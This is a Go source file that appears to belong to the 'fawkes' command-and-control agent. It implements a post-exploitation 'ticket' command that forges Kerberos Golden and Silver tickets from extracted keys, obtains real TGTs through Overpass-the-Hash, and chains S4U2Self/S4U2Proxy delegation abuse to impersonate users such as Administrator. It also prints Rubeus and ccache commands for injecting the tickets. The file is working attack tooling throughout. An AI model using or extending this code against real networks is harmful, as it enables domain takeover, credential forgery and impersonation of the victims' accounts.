// ticket.go implements the ticket command for Kerberos ticket operations.
// KDC protocol functions are in ticket_kdc.go.
// Serialization (kirbi/ccache) functions are in ticket_serialize.go.

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/asn1tools"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type TicketCommand struct{}

func (c *TicketCommand) Name() string { return "ticket" }
func (c *TicketCommand) Description() string {
	return "Forge Kerberos tickets (Golden/Silver) from extracted keys (T1558.001)"
}

type ticketArgs struct {
	Action      string `json:"action"`      // forge, request, s4u
	Realm       string `json:"realm"`       // domain (e.g., CORP.LOCAL)
	Username    string `json:"username"`    // target identity (e.g., Administrator)
	UserRID     int    `json:"user_rid"`    // RID (default: 500 for Administrator)
	DomainSID   string `json:"domain_sid"`  // domain SID (e.g., S-1-5-21-...)
	Key         string `json:"key"`         // hex AES256 or NT hash key
	KeyType     string `json:"key_type"`    // aes256, aes128, rc4 (default: aes256)
	KVNO        int    `json:"kvno"`        // key version number (default: 2)
	Lifetime    int    `json:"lifetime"`    // ticket lifetime in hours (default: 24)
	Format      string `json:"format"`      // kirbi, ccache (default: kirbi)
	SPN         string `json:"spn"`         // Silver Ticket: service/host, or S4U2Proxy: target SPN
	Server      string `json:"server"`      // KDC address for request/s4u action
	Impersonate string `json:"impersonate"` // S4U: user to impersonate (e.g., Administrator)
}

func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -action forge -realm DOMAIN -username user -key <hex_key> -domain_sid <SID>")
	}

	var args ticketArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "forge":
		return ticketForge(args)
	case "request":
		return ticketRequest(args)
	case "s4u":
		return ticketS4U(args)
	default:
		return errorf("Unknown action: %s. Use: forge, request, s4u", args.Action)
	}
}

func ticketForge(args ticketArgs) structs.CommandResult {
	defer structs.ZeroString(&args.Key)

	// Validate required args
	if args.Realm == "" || args.Username == "" || args.Key == "" || args.DomainSID == "" {
		return errorResult("Error: realm, username, key, and domain_sid are required for forging")
	}

	// Defaults
	if args.UserRID <= 0 {
		args.UserRID = 500 // Administrator
	}
	if args.Lifetime <= 0 {
		args.Lifetime = 24
	}
	if args.KVNO <= 0 {
		args.KVNO = 2
	}
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}

	realm := strings.ToUpper(args.Realm)

	// Decode the key
	keyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding key hex: %v", err)
	}
	defer structs.ZeroBytes(keyBytes)

	// Validate key type and length using shared helper
	etypeID, _, errResult := ticketParseKeyType(args.KeyType, keyBytes)
	if errResult != nil {
		return *errResult
	}

	serviceKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyBytes,
	}

	// Generate random session key (same etype as service key)
	sessionKey, err := ticketGenerateSessionKey(etypeID)
	if err != nil {
		return errorf("Error generating session key: %v", err)
	}
	defer structs.ZeroBytes(sessionKey.KeyValue)

	// Determine service principal
	var sname types.PrincipalName
	isGolden := args.SPN == ""
	if isGolden {
		// Golden Ticket: TGT for krbtgt/REALM
		sname = types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: []string{"krbtgt", realm},
		}
	} else {
		// Silver Ticket: TGS for specific SPN (e.g., cifs/dc01.corp.local)
		parts := strings.SplitN(args.SPN, "/", 2)
		sname = types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: parts,
		}
	}

	now := time.Now().UTC()
	endTime := now.Add(time.Duration(args.Lifetime) * time.Hour)
	renewTill := now.Add(7 * 24 * time.Hour)

	// Ticket flags: Forwardable | Proxiable | Renewable | Initial | Pre-authent
	flagBytes := make([]byte, 4)
	flagBytes[0] = 0x50 // Forwardable (bit 1) | Proxiable (bit 3)
	flagBytes[1] = 0xa0 // Renewable (bit 8) | Initial (bit 9)
	// bit 10 = Pre-authent
	flagBytes[1] |= 0x10
	ticketFlags := asn1.BitString{Bytes: flagBytes, BitLength: 32}

	// Create EncTicketPart
	etp := messages.EncTicketPart{
		Flags:  ticketFlags,
		Key:    sessionKey,
		CRealm: realm,
		CName: types.PrincipalName{
			NameType:   nametype.KRB_NT_PRINCIPAL,
			NameString: []string{args.Username},
		},
		Transited: messages.TransitedEncoding{
			TRType:   0,
			Contents: []byte{},
		},
		AuthTime:  now,
		StartTime: now,
		EndTime:   endTime,
		RenewTill: renewTill,
	}

	// Marshal and encrypt
	etpBytes, err := asn1.Marshal(etp)
	if err != nil {
		return errorf("Error marshaling EncTicketPart: %v", err)
	}
	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)

	encData, err := crypto.GetEncryptedData(etpBytes, serviceKey, keyusage.KDC_REP_TICKET, args.KVNO)
	if err != nil {
		return errorf("Error encrypting ticket: %v", err)
	}

	ticket := messages.Ticket{
		TktVNO:  5, // iana.PVNO
		Realm:   realm,
		SName:   sname,
		EncPart: encData,
	}

	// Generate output
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(ticket, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := ticket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

func ticketFormatOutput(args ticketArgs, realm string, isGolden bool, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	ticketType := "Golden Ticket (TGT)"
	if !isGolden {
		ticketType = fmt.Sprintf("Silver Ticket (TGS: %s)", args.SPN)
	}
	sb.WriteString(fmt.Sprintf("[*] %s forged successfully\n", ticketType))
	sb.WriteString(fmt.Sprintf("    User:      %s@%s (RID: %d)\n", args.Username, realm, args.UserRID))
	sb.WriteString(fmt.Sprintf("    Domain:    %s\n", realm))
	sb.WriteString(fmt.Sprintf("    SID:       %s\n", args.DomainSID))
	sb.WriteString(fmt.Sprintf("    Key Type:  %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:     %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:    %s\n", args.Format))
	sb.WriteString(fmt.Sprintf("    KVNO:      %d\n", args.KVNO))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Usage: Rubeus.exe ptt /ticket:<base64>\n")
		sb.WriteString("[*] Usage: [IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))\n")
	} else {
		sb.WriteString("\n[*] Usage: echo '<base64>' | base64 -d > /tmp/krb5cc_forged\n")
		sb.WriteString("[*] Usage: export KRB5CCNAME=/tmp/krb5cc_forged\n")
	}

	return sb.String()
}

// ticketRequest performs an AS exchange (Overpass-the-Hash / Pass-the-Key) to obtain
// a real TGT from the KDC using an extracted Kerberos key. The resulting TGT can be
// exported as kirbi or ccache and injected via klist import. (T1550.002)
func ticketRequest(args ticketArgs) structs.CommandResult {
	defer structs.ZeroString(&args.Key)

	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" {
		return errorResult("Error: realm, username, key, and server (KDC) are required for request")
	}

	realm := strings.ToUpper(args.Realm)
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}

	// Parse key
	keyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding key hex: %v", err)
	}
	defer structs.ZeroBytes(keyBytes)

	etypeID, etypeCfgName, errResult := ticketParseKeyType(args.KeyType, keyBytes)
	if errResult != nil {
		return *errResult
	}

	userKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyBytes,
	}

	// Resolve KDC address
	kdcAddr := args.Server
	if !strings.Contains(kdcAddr, ":") {
		kdcAddr += ":88"
	}

	// Create gokrb5 config
	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
	cfg, err := config.NewFromString(cfgStr)
	if err != nil {
		return errorf("Error creating Kerberos config: %v", err)
	}

	// Build AS-REQ
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{args.Username},
	}
	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return errorf("Error building AS-REQ: %v", err)
	}

	// Force our etype
	asReq.ReqBody.EType = []int32{etypeID}

	// Add PA-ENC-TIMESTAMP pre-authentication
	paTS := types.PAEncTSEnc{
		PATimestamp: time.Now().UTC(),
	}
	paTSBytes, err := asn1.Marshal(paTS)
	if err != nil {
		return errorf("Error marshaling PA-ENC-TIMESTAMP: %v", err)
	}
	encTS, err := crypto.GetEncryptedData(paTSBytes, userKey, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
	if err != nil {
		return errorf("Error encrypting PA-ENC-TIMESTAMP: %v", err)
	}
	encTSBytes, err := asn1.Marshal(encTS)
	if err != nil {
		return errorf("Error marshaling encrypted timestamp: %v", err)
	}
	asReq.PAData = types.PADataSequence{
		{PADataType: 2, PADataValue: encTSBytes}, // PA-ENC-TIMESTAMP
	}

	// Marshal AS-REQ
	reqBytes, err := asReq.Marshal()
	if err != nil {
		return errorf("Error marshaling AS-REQ: %v", err)
	}

	// Send over TCP to KDC
	conn, err := net.DialTimeout("tcp", kdcAddr, 10*time.Second)
	if err != nil {
		return errorf("Error connecting to KDC %s: %v", kdcAddr, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))

	// TCP Kerberos framing: 4-byte big-endian length prefix
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return errorf("Error sending to KDC: %v", err)
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return errorf("Error sending AS-REQ: %v", err)
	}

	// Read response
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return errorf("Error reading KDC response length: %v", err)
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1048576 {
		return errorf("Error: KDC response too large (%d bytes)", respLen)
	}
	respBuf := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respBuf); err != nil {
		return errorf("Error reading KDC response: %v", err)
	}

	// Check if response is KRB-ERROR ([APPLICATION 30] = 0x7e)
	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		var krbErr messages.KRBError
		if err := krbErr.Unmarshal(respBuf); err == nil {
			errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
			if krbErr.EText != "" {
				errMsg += ": " + krbErr.EText
			}
			return errorf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode)
		}
	}

	// Parse AS-REP
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		return errorf("Error parsing AS-REP: %v", err)
	}

	// Decrypt EncPart manually using crypto.DecryptEncPart
	// (ASRep.DecryptEncPart requires credentials.Credentials, so we use the lower-level API)
	plainBytes, err := crypto.DecryptEncPart(asRep.EncPart, userKey, 3) // key usage 3 = AS-REP EncPart
	if err != nil {
		return errorf("Error decrypting AS-REP (wrong key?): %v", err)
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return errorf("Error parsing decrypted AS-REP: %v", err)
	}

	// Extract ticket info from decrypted AS-REP
	sessionKey := decPart.Key
	sname := decPart.SName
	ticketFlags := decPart.Flags
	authTime := decPart.AuthTime
	endTime := decPart.EndTime
	renewTill := decPart.RenewTill

	// Export as kirbi or ccache
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(asRep.Ticket, sessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := asRep.Ticket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

func ticketRequestFormatOutput(args ticketArgs, realm string, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	sb.WriteString("[*] TGT obtained via Overpass-the-Hash (AS-REQ)\n")
	sb.WriteString(fmt.Sprintf("    User:      %s@%s\n", args.Username, realm))
	sb.WriteString(fmt.Sprintf("    KDC:       %s\n", args.Server))
	sb.WriteString(fmt.Sprintf("    Key Type:  %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:     %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:    %s\n", args.Format))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
	} else {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
	}

	return sb.String()
}

// ticketS4U performs S4U2Self + S4U2Proxy to obtain a service ticket for an impersonated
// user via constrained delegation. Uses a service account's key to get a TGT, then
// S4U2Self for impersonation, then S4U2Proxy to access the target SPN. (T1134.001)
func ticketS4U(args ticketArgs) structs.CommandResult {
	defer structs.ZeroString(&args.Key)

	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" || args.Impersonate == "" || args.SPN == "" {
		return errorResult("Error: realm, username (service account), key, server (KDC), impersonate (target user), and spn (target service) are required for s4u")
	}

	realm := strings.ToUpper(args.Realm)
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}

	// Parse service account key
	keyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding key hex: %v", err)
	}
	defer structs.ZeroBytes(keyBytes)

	etypeID, etypeCfgName, errResult := ticketParseKeyType(args.KeyType, keyBytes)
	if errResult != nil {
		return *errResult
	}

	userKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyBytes,
	}

	// Resolve KDC address
	kdcAddr := args.Server
	if !strings.Contains(kdcAddr, ":") {
		kdcAddr += ":88"
	}

	// Step 1: Get TGT for service account via OPtH
	tgt, sessionKey, err := ticketOPtH(args.Username, realm, etypeID, etypeCfgName, userKey, kdcAddr)
	if err != nil {
		return errorf("Error obtaining TGT for %s: %v", args.Username, err)
	}

	// Step 2: S4U2Self — request TGS for impersonated user to service account
	s4uSelfTicket, s4uSelfSessionKey, err := ticketS4U2Self(args.Username, args.Impersonate, realm, etypeID, etypeCfgName, tgt, sessionKey, kdcAddr)
	if err != nil {
		return errorf("Error in S4U2Self: %v", err)
	}

	// Step 3: S4U2Proxy — use S4U2Self ticket to get TGS for target service
	s4uProxyTicket, s4uProxyDecPart, err := ticketS4U2Proxy(args.Username, args.SPN, realm, etypeID, etypeCfgName, tgt, sessionKey, s4uSelfTicket, kdcAddr)
	if err != nil {
		return errorf("Error in S4U2Proxy: %v", err)
	}

	// Export as kirbi or ccache
	proxySessionKey := s4uProxyDecPart.Key
	proxyFlags := s4uProxyDecPart.Flags
	authTime := s4uProxyDecPart.AuthTime
	endTime := s4uProxyDecPart.EndTime
	renewTill := s4uProxyDecPart.RenewTill

	// Parse target SPN into PrincipalName
	spnParts := strings.SplitN(args.SPN, "/", 2)
	targetSName := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: spnParts,
	}

	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(s4uProxyTicket, proxySessionKey, args.Impersonate, realm, targetSName, proxyFlags, authTime, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = ticketS4UFormatOutput(args, realm, s4uSelfSessionKey, proxySessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := s4uProxyTicket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, proxySessionKey, args.Impersonate, realm, targetSName, proxyFlags, authTime, endTime, renewTill)
		output = ticketS4UFormatOutput(args, realm, s4uSelfSessionKey, proxySessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

func ticketS4UFormatOutput(args ticketArgs, realm string, selfSessionKey, proxySessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	sb.WriteString("[*] S4U delegation attack completed\n")
	sb.WriteString(fmt.Sprintf("    Service Account: %s@%s\n", args.Username, realm))
	sb.WriteString(fmt.Sprintf("    Impersonated:    %s@%s\n", args.Impersonate, realm))
	sb.WriteString(fmt.Sprintf("    Target SPN:      %s\n", args.SPN))
	sb.WriteString(fmt.Sprintf("    KDC:             %s\n", args.Server))
	sb.WriteString(fmt.Sprintf("    Key Type:        %s (etype %d)\n", args.KeyType, proxySessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:           %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:          %s\n", args.Format))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket (for %s as %s):\n%s\n", args.Format, args.SPN, args.Impersonate, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
	} else {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
	}

	return sb.String()
}
